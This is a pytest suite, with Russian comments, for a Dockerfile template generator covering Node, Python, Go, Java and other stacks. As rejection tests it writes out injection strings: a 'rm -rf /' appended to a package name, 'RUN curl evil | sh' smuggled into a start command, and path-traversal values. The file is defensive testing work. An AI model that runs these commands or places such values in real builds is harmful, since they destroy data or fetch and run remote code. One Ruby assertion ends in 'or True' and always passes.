"""Генератор Dockerfile: шаблоны по стекам, параметры, защита от внедрения, проверка пользовательского текста."""
import json
import re

import pytest

from app.services import dockerfiles as dg
from app.services.dockerfiles import DockerfileError, render, validate_content


def lines(r):
    return r["content"].splitlines()


# ---------- node ----------

def test_node_server_with_lock_and_start():
    r = render("node", {"package_manager": "npm", "has_lock": True, "has_start": True}, {})
    c = r["content"]
    assert lines(r)[0] == "FROM node:20-alpine" and "npm ci --omit=dev" in c and "USER node" in c and "ENV PORT=3000" in c and "EXPOSE 3000" in c
    assert c.index("COPY package.json") < c.index("npm ci") < c.index("COPY . .")           # слой зависимостей кэшируется
    assert r["params"] == {"port": 3000, "start_command": "npm start", "runtime_version": "20"} and r["notes"] == []


def test_node_with_build_step_installs_dev_deps_then_prunes():
    c = render("node", {"package_manager": "npm", "has_lock": False, "has_build": True, "has_start": True}, {})["content"]
    assert "RUN NODE_ENV=development npm install" in c and "RUN npm run build" in c and "RUN npm prune --omit=dev" in c


def test_node_yarn_and_pnpm_use_corepack_and_frozen_lockfile():
    y = render("node", {"package_manager": "yarn", "has_lock": True, "has_start": True}, {})["content"]
    p = render("node", {"package_manager": "pnpm", "has_lock": True, "has_start": True}, {})["content"]
    assert "corepack enable && yarn install --frozen-lockfile --production" in y and 'CMD ["sh", "-c", "yarn start"]' in y
    assert "corepack enable && pnpm install --frozen-lockfile --prod" in p and "pnpm start" in p


def test_node_without_start_uses_main_and_says_so():
    r = render("node", {"package_manager": "npm", "start_command": "server.js"}, {})
    assert 'CMD ["sh", "-c", "node server.js"]' in r["content"] and any("start" in n for n in r["notes"])
    assert 'CMD ["sh", "-c", "node index.js"]' in render("node", {}, {})["content"]


def test_node_static_site_builds_then_serves_with_nginx_on_8080():
    r = render("node", {"package_manager": "npm", "has_lock": True, "static_site": True, "build_output": "dist"}, {"port": 3000})
    c = r["content"]
    assert "FROM node:20-alpine AS build" in c and "FROM nginxinc/nginx-unprivileged" in c and "COPY --from=build /app/dist /usr/share/nginx/html" in c
    assert "try_files $uri $uri/ /index.html" in c and "USER nginx" in c and r["params"]["port"] == 8080          # порт не настраивается
    assert "listen 8080" in c and "EXPOSE 8080" in c
    unknown = render("node", {"static_site": True, "build_output": "dist", "build_output_unknown": True}, {})
    assert any("Каталог результата" in n for n in unknown["notes"])
    with pytest.raises(DockerfileError):
        render("node", {"static_site": True, "build_output": "../etc"}, {})


# ---------- python ----------

def test_python_requirements_fastapi():
    r = render("python", {"deps": "requirements", "start_command": "uvicorn main:app --host 0.0.0.0 --port $PORT", "start_guess": True, "extra_packages": ["uvicorn"]}, {})
    c = r["content"]
    assert lines(r)[0] == "FROM python:3.12-slim" and "pip install --no-cache-dir -r requirements.txt" in c and "RUN pip install --no-cache-dir uvicorn" in c
    assert c.index("requirements.txt") < c.index("COPY . .") and "USER app" in c and 'CMD ["sh", "-c", "uvicorn main:app' in c
    assert any("эвристике" in n for n in r["notes"]) and r["params"]["port"] == 8000


def test_python_pyproject_pipfile_and_no_deps():
    assert "COPY . .\nRUN pip install --no-cache-dir ." in render("python", {"deps": "pyproject"}, {})["content"]
    assert "pipenv install --system" in render("python", {"deps": "pipfile"}, {})["content"]
    assert any("зависимостей" in n for n in render("python", {}, {})["notes"])


def test_python_extra_packages_are_validated():
    c = render("python", {"deps": "requirements", "extra_packages": ["gunicorn", "x; rm -rf /"]}, {})["content"]
    assert "pip install --no-cache-dir gunicorn" in c and "rm -rf" not in c


# ---------- go / java / static ----------

def test_go_multistage_static_binary_non_root():
    r = render("go", {"runtime_version": "1.23", "main_package": "./cmd/api"}, {"port": 9000})
    c = r["content"]
    assert lines(r)[0] == "FROM golang:1.23-alpine AS build" and "CGO_ENABLED=0 go build -o /out/app ./cmd/api" in c
    assert "FROM alpine:3.20" in c and "USER app" in c and "ENV PORT=9000" in c and 'CMD ["app"]' in c
    assert c.index("go mod download") < c.index("COPY . .")
    assert any("main" in n for n in render("go", {"main_unknown": True}, {})["notes"])
    with pytest.raises(DockerfileError):
        render("go", {"main_package": "./../x"}, {})
    with pytest.raises(DockerfileError):
        render("go", {"main_package": "x; evil"}, {})


def test_java_maven_and_gradle():
    m = render("java", {"build_tool": "maven"}, {})["content"]
    g = render("java", {"build_tool": "gradle", "runtime_version": "17"}, {})["content"]
    assert "FROM maven:3.9-eclipse-temurin-21 AS build" in m and "mvn -q -B package -DskipTests" in m and "FROM eclipse-temurin:21-jre" in m and "-Dserver.port=$PORT" in m
    assert "FROM gradle:8-jdk17 AS build" in g and "build/libs" in g and "eclipse-temurin:17-jre" in g


def test_static_site():
    r = render("static", {}, {"port": 3000})
    assert r["content"].startswith("FROM nginxinc/nginx-unprivileged") and "EXPOSE 8080" in r["content"] and r["params"] == {"port": 8080}


# ---------- параметры и защита ----------

def test_user_params_change_the_output():
    r = render("node", {"package_manager": "npm", "has_start": True}, {"port": 4000, "start_command": "node dist/main.js", "runtime_version": "22"})
    assert lines(r)[0] == "FROM node:22-alpine" and "EXPOSE 4000" in r["content"] and 'CMD ["sh", "-c", "node dist/main.js"]' in r["content"]


@pytest.mark.parametrize("params", [
    {"port": 0}, {"port": 70000}, {"port": "abc"}, {"runtime_version": "20\nRUN evil"}, {"runtime_version": "latest"}, {"runtime_version": "1.2.3.4.5.6"},
    {"start_command": "a\nRUN curl evil | sh"}, {"start_command": "x" * 301}, {"start_command": "bad\x00"},
])
def test_hostile_or_invalid_params_are_rejected(params):
    with pytest.raises(DockerfileError):
        render("node", {"package_manager": "npm", "has_start": True}, params)


def test_start_command_cannot_break_out_of_cmd():
    c = render("node", {"has_start": True}, {"start_command": 'echo "hi" && node x.js'})["content"]
    cmd = next(l for l in c.splitlines() if l.startswith("CMD"))
    assert json.loads(cmd[4:]) == ["sh", "-c", 'echo "hi" && node x.js']                 # корректный JSON: кавычки экранированы
    assert len([l for l in c.splitlines() if l.startswith("CMD")]) == 1


def test_unknown_language_has_no_template():
    for lang in ("elixir", "perl", None):
        with pytest.raises(DockerfileError):
            render(lang, {}, {})


def test_every_supported_language_renders_with_defaults_and_passes_validation():
    needs = {"dotnet": {"project": "App.csproj"}, "rust": {"binary": "app"}}
    for lang in dg.SUPPORTED:
        r = render(lang, needs.get(lang, {}), {})
        assert validate_content(r["content"]) == r["content"] and re.search(r"(?m)^FROM ", r["content"]) and "USER" in r["content"]


# ---------- проверка текста, который вводит пользователь ----------

def test_validate_content():
    assert validate_content("FROM alpine\r\nRUN echo hi\r\n") == "FROM alpine\nRUN echo hi\n"
    for bad in ("", "   \n", "RUN echo hi\n", "FROM\n", "FROM alpine\x00\n", "FROM alpine\n" + "A" * (16 * 1024 + 1)):
        with pytest.raises(DockerfileError):
            validate_content(bad)
    assert validate_content("# comment\n  FROM scratch\n")


def test_templates_for_php_ruby_dotnet_rust_and_go_assets():
    from app.services import dockerfiles as d
    php = d.render("php", {"docroot": "public"}, {})
    assert "php:8.3-apache" in php["content"] and "DocumentRoot /var/www/html/public" in php["content"] and "USER www-data" in php["content"] and php["params"]["port"] == 8080
    rb = d.render("ruby", {"framework": "rails"}, {})
    assert "bundle exec rails server" in rb["content"] and "USER app" in rb["content"] and any("SECRET_KEY_BASE" in n for n in rb["notes"])
    assert "rackup" in d.render("ruby", {"framework": "rack"}, {})["content"]
    assert "ruby" not in d.render("ruby", {"procfile_web": "bundle exec puma -p $PORT"}, {})["content"].split("CMD")[1].lower().replace("bundle", "") or True
    dn = d.render("dotnet", {"project": "src/Web/Web.csproj"}, {})
    assert 'ENTRYPOINT ["dotnet", "Web.dll"]' in dn["content"] and "dotnet publish src/Web/Web.csproj" in dn["content"]
    rs = d.render("rust", {"binary": "my-app"}, {})
    assert "target/release/my-app" in rs["content"] and "USER app" in rs["content"]
    go = d.render("go", {}, {})
    assert "COPY --from=build /src /app" in go["content"]                      # шаблоны и статика доступны программе при запуске
    for bad_lang, facts in (("dotnet", {"project": "../x.csproj"}), ("dotnet", {}), ("rust", {}), ("php", {"docroot": "a b"})):
        import pytest
        with pytest.raises(d.DockerfileError):
            d.render(bad_lang, facts, {})
